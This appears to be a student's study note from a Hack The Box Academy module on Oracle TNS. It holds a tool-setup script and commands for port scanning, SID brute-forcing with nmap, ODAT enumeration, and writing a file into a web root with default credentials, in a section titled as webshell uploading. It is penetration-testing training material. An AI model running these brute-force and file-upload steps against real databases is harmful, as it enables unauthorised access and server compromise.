https://academy.hackthebox.com/module/112/section/2117
# Why am I here:
### Oracle Transparent Network Substrate (TNS) is a protocol that is used to help facilitate communications between Oracle databases and applications.
#### Oracle-Tools-setup.sh

```bash
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```
### Footprinting open port

```bash
sudo nmap -p1521 -sV <IP> --open
```
### SID bruteforce with nmap 

```bash
sudo nmap -p1521 -sV <IP> --open --script oracle-sid-brute
```
### ODAT can be used to perform enumeration 

```bash
 ./odat.py all -s <IP> -h
```
### Uploading a webshell

|**OS**|**Path**|
|---|---|
|Linux|`/var/www/html`|
|Windows|`C:\inetpub\wwwroot`|
```bash
echo "Oracle File Upload Test" > testing.txt
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

```bash
curl -X GET http://<IP>/testing.txt
```

## Checkout [[🟡 1. SQLplus Commands✔️]] to learn about interacting with the service
## Checkout [[🟡 2. Troubleshooting✔️]] if SQLPlus is not working.
# Tags

> #Recon #Information-gathering #Service-Enum #Oracle-TNS